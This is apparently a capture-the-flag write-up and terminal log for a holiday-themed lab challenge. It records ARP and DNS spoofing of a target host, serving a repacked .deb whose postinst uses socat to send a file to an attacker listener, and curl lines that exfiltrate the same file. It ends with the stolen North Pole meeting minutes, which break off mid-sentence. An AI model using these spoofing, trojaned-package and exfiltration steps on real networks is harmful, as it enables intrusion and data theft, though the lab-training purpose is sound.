                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=49061
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=8866 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=8866
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=34580 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=34580
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                guest@10bd7aa40918:~/debs$ python3 -m http.server 80

                10.6.6.35 - - [30/Dec/2020 19:43:31] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:32] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:32] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:33] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:33] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:35] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:35] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:36] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:36] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:37] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:37] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:38] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:38] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:39] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:39] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:40] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:40] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:41] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:41] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:42] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:42] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:43] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:43] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
            
2020-12-31 18:17:26.290 +00:00 [INF] Working with debs 

                https://www.guardicore.com/2019/01/a-vulnerability-in-debians-apt-allows-for-easy-lateral-movement-in-data-centers

                https://unix.stackexchange.com/questions/138188/easily-unpack-deb-edit-postinst-and-repack-deb#:~:text=The%20primary%20command%20to%20manipulate%20deb%20packages%20is,tmp%20%23%20edit%20DEBIAN%2Fpostinst%20dpkg-deb%20-b%20tmp%20fixed.deb
                mkdir tmp
                dpkg-deb -R original.deb tmp
                # edit DEBIAN/postinst
                dpkg-deb -b tmp fixed.deb


                guest@10bd7aa40918:~/debs$ ls -hs
                total 2.5M
                 96K gedit-common_3.36.1-1_all.deb                      264K nano_4.8-1ubuntu1_amd64.deb                    1.6M nmap_7.80+dfsg1-2build1_amd64.deb  4.0K temp
                 16K golang-github-huandu-xstrings-dev_1.2.1-1_all.deb   64K netcat-traditional_1.10-41.1ubuntu1_amd64.deb  316K socat_1.7.3.3-2_amd64.deb          168K unzip_6.0-25ubuntu1_amd64.deb
                guest@10bd7aa40918:~/debs$ dpkg-deb -R golang-github-huandu-xstrings-dev_1.2.1-1_all.deb temp/
                guest@10bd7aa40918:~/debs$ ls temp/
                DEBIAN  usr
                guest@10bd7aa40918:~/debs$ mkdir 1
                guest@10bd7aa40918:~/debs$ mkdir 2
                guest@10bd7aa40918:~/debs$ mkdir 3
                guest@10bd7aa40918:~/debs$ mkdir 4
                

                mkdir tmp
                dpkg-deb -R original.deb tmp
                
                # edit DEBIAN/postinst

                dpkg-deb -b tmp fixed.deb
                          

            
2020-12-31 18:17:26.401 +00:00 [INF] Create simple python HTTP server... 

                    #!/usr/bin/python3
                    from http.server import HTTPServer, BaseHTTPRequestHandler
                    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                        def do_GET(self):
                            self.send_response(200)
                            self.end_headers()
                            self.wfile.write(b'Hello, world!')
                    httpd = HTTPServer(('', 80), SimpleHTTPRequestHandler)
                    httpd.serve_forever()


                    https://blog.anvileight.com/posts/simple-python-http-server/
                    https://stackabuse.com/serving-files-with-pythons-simplehttpserver-module/
            
2020-12-31 18:17:26.427 +00:00 [INF] Use web_01.py to send mr JF a nice surprice... 

                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=15775 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=15775
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=57281 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=57281
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=13659 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13659
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=21458 UDP.dport=domain                                  
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=21458
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=12950 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=12950
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=5401 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=5401
                ^Cguest@10bd7aa40918:~$                                                                                                                     │
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                /pub/jfrost/backdoor/suriv_amd64.deb
                10.6.6.35 - - [30/Dec/2020 21:06:05] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 21:06:05] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
                guest@10bd7aa40918:~/debs$ nano w.py 
                guest@10bd7aa40918:~/debs$ ./w.py 
                127.0.0.1 - - [30/Dec/2020 21:10:45] "GET / HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:14] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:15] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:16] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:17] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:18] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:19] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:20] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:22] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:23] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
            
2020-12-31 18:17:26.496 +00:00 [INF] Once I figure out what is wrong with DNS. It stopped working :(

                let's add this to deb package so the host will send us the text

                curl 10.6.0.3:80/helloworld
                curl 10.6.0.3:80 --data-binary '@/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt'

            
2020-12-31 18:17:26.523 +00:00 [INF] It is important to send only one DNS reply. This will trigger HTTP GET request where we will give back the surprice deb.


















                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=14641 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=14641
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=57018 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=57018
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=11997 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=11997
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=28779 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=28779
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=20591 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=20591
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=1115 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=1115
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=25292 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=25292
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=62959 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=62959
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │
                                                                                                                                                            │
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                  138 32.347994655 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  139 32.364439143    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  140 33.363977127 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  141 33.387950848 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  142 33.404427518    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  143 34.403985552 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  144 34.427945401 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  145 34.444458999    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  146 35.448045967 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  147 35.479992572 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  148 35.504382190    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  149 36.504138075 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  150 36.536124703 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  151 36.568773276    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  152 37.563968557 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  153 37.587932354 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  154 37.604424619    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  155 38.611986196 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  156 38.636061736 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  157 38.660322843    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                157 packets captured
                guest@7359217127bd:~$ nano w.py
                guest@7359217127bd:~$ chmod +x w.py 
                guest@7359217127bd:~$ ./w.py 
                10.6.6.35 - - [30/Dec/2020 23:08:07] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 23:08:16] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
                10.6.6.35 - - [30/Dec/2020 23:08:22] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -


            
2020-12-31 18:17:26.725 +00:00 [INF] Repack deb file
  
                cd debs
                rm golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
                mkdir temp
                dpkg-deb -R nano_4.8-1ubuntu1_amd64.deb temp
                nano temp/DEBIAN/postinst
                nano temp/DEBIAN/prerm
                dpkg-deb -b temp golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
                cd ..


            
2020-12-31 18:17:26.727 +00:00 [INF] netcat-traditional_1.10-41.1ubuntu1_amd64.deb content:
  
                guest@a20adb74486a:~/debs/netcat$ ls -R 
                .:
                bin  usr
                ./bin:
                nc.traditional
                ./usr:
                share
                ./usr/share:
                doc  man
                ./usr/share/doc:
                netcat-traditional
                ./usr/share/doc/netcat-traditional:
                README.Debian  README.gz  changelog.Debian.gz  copyright  examples
                ./usr/share/doc/netcat-traditional/examples:
                contrib  data  scripts
                ./usr/share/doc/netcat-traditional/examples/contrib:
                ncmeter
                ./usr/share/doc/netcat-traditional/examples/data:
                Makefile  README  data.c  dns-any.d  nfs-0.d  pm.d  pmap-dump.d  pmap-mnt.d  rip.d  rservice.c  showmount.d  xor.c
                ./usr/share/doc/netcat-traditional/examples/scripts:
                README  alta  bsh  dist.sh  irc  iscan  ncp  probe  web  webproxy  webrelay  websearch
                ./usr/share/man:
                man1
                ./usr/share/man/man1:
                nc.traditional.1.gz


                guest@a20adb74486a:~/debs/netcat$ ls -R -sh
                .:
                total 8.0K
                4.0K bin  4.0K usr
                ./bin:
                total 36K
                36K nc.traditional
                ./usr:
                total 4.0K
                4.0K share
                ./usr/share:
                total 8.0K
                4.0K doc  4.0K man
                ./usr/share/doc:
                total 4.0K
                4.0K netcat-traditional
                ./usr/share/doc/netcat-traditional:
                total 40K
                4.0K README.Debian   24K README.gz  4.0K changelog.Debian.gz  4.0K copyright  4.0K examples
                ./usr/share/doc/netcat-traditional/examples:
                total 12K
                4.0K contrib  4.0K data  4.0K scripts
                ./usr/share/doc/netcat-traditional/examples/contrib:
                total 4.0K
                4.0K ncmeter
                ./usr/share/doc/netcat-traditional/examples/data:
                total 52K
                4.0K Makefile  4.0K README  8.0K data.c  4.0K dns-any.d  4.0K nfs-0.d  4.0K pm.d  4.0K pmap-dump.d  4.0K pmap-mnt.d  4.0K rip.d  4.0K rservice.c  4.0K showmount.d  4.0K xor.c
                ./usr/share/doc/netcat-traditional/examples/scripts:
                total 56K
                4.0K README  4.0K alta  4.0K bsh  4.0K dist.sh  4.0K irc  4.0K iscan  4.0K ncp  4.0K probe  8.0K web  8.0K webproxy  4.0K webrelay  4.0K websearch
                ./usr/share/man:
                total 4.0K
                4.0K man1
                ./usr/share/man/man1:
                total 4.0K
                4.0K nc.traditional.1.gz
                guest@a20adb74486a:~/debs/netcat$ 

            
2020-12-31 18:17:26.803 +00:00 [INF] Solution


                Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
                Help the North Pole by getting command line access back to this host.
                Read the HELP.md file for information to help you in this endeavor.
                Note: The terminal lifetime expires after 30 or more minutes so be 
                sure to copy off any essential work you have done as you go.

                guest@fa903c5a8046:~$ nano a.py
                guest@fa903c5a8046:~$ nano d.py
                guest@fa903c5a8046:~$ nano w.py
                guest@fa903c5a8046:~$ chmod +x a.py d.py w.py 
                guest@fa903c5a8046:~$ mkdir debs/s
                guest@fa903c5a8046:~$ dpkg-deb -R debs/socat_1.7.3.3-2_amd64.deb debs/s
                guest@fa903c5a8046:~$ ifconfig
                guest@fa903c5a8046:~$ nano debs/s/DEBIAN/postinst
                guest@fa903c5a8046:~$ cat debs/s/DEBIAN/postinst
                
                #!/bin/sh
                socat -u FILE:/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt TCP:10.6.0.2:10001
                
                guest@fa903c5a8046:~$ chmod +x debs/s/DEBIAN/postinst
                guest@fa903c5a8046:~$ dpkg-deb -b debs/s debs/suriv_amd64.deb
                dpkg-deb: building package 'socat' in 'debs/suriv_amd64.deb'.

                guest@fa903c5a8046:~$ ./a.py &
                guest@fa903c5a8046:~$ ./w.py &
                guest@fa903c5a8046:~$ socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat &
                [1] 179
                guest@fa903c5a8046:~$ ./d.py

                <- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:02 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=19105 UDP.dport=domain
                => Ether.src=02:42:0a:06:00:02 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=19105
                [1]+  Done                    socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat

    


                NORTH POLE
                LAND USE BOARD
                MEETING MINUTES
                January 20, 2020
                Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole
                Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.
                Roll call of Board members please:
                Chairman Jack Frost - Present
                Vice Chairman Mother Nature - Present
                Superman - Present
                Clarice - Present
                Yukon Cornelius - HERE!
                Ginger Breaddie - Present
                King Moonracer - Present
                Mrs. Donner - Present
                Tanta Kringle - Present
                Charlie In-the-Box - Here
                Krampus - Growl
                Dolly - Present
                Snow Miser - Heya!
                Alabaster Snowball - Hello
                Queen of the Winter Spirits - Present
                ALSO PRESENT:
                                Kris Kringle
                                Pepper Minstix
                                Heat Miser
                                Father Time
                Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- f
                or people who are interested in this meeting.
                Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.
                OLD BUSINESS: No Old Business.
                RESOLUTIONS:
                The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering report
                s. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local 
